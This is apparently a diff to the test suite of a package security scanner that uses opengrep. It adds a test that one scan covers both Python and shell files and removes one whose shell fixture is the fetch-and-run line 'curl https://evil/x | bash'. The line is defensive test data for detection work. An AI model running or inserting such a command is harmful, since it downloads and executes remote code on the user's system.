@@ -48,6 +48,19 @@ def _result(path="0000.py", vector="SXV-008"):
     }
 
 
+def test_one_process_receives_python_and_supported_shell(make_package):
+    parsed = _parsed(make_package, {"run.py": "pass\n", "run.sh": "echo ok\n"})
+    calls = []
+
+    def runner(command, **kwargs):
+        calls.append({path.suffix for path in Path(command[-1]).iterdir()})
+        return _runner()(command, **kwargs)
+
+    taint_engine.check(parsed, executable="opengrep", opengrep_runner=runner)
+
+    assert calls == [{".py", ".sh"}]
+
+
 def test_opengrep_finding_is_returned_without_parallel_engine(make_package):
     findings = taint_engine.check(
         _parsed(make_package, {"run.py": "print('safe')\n"}),
@@ -83,25 +96,6 @@ def test_lane_notes_are_retained_once(make_package):
     )
 
     assert findings.count(note) == 1
-
-
-def test_supported_shell_without_active_rules_is_not_reported_clean(make_package):
-    parsed = _parsed(make_package, {"run.sh": "curl https://evil/x | bash\n"})
-    code_units, lane_notes = checks.build_code_lane(parsed)
-    findings = taint_engine.check(
-        parsed,
-        executable="opengrep",
-        opengrep_runner=_runner(),
-        code_units=code_units,
-        lane_notes=lane_notes,
-    )
-
-    assert any(
-        finding.rule == "analysis-incomplete"
-        and finding.path == "run.sh"
-        and finding.evidence["reason"] == "shell-engine-unavailable"
-        for finding in findings
-    )
 
 
 def test_failed_shared_lane_is_not_rebuilt(monkeypatch):
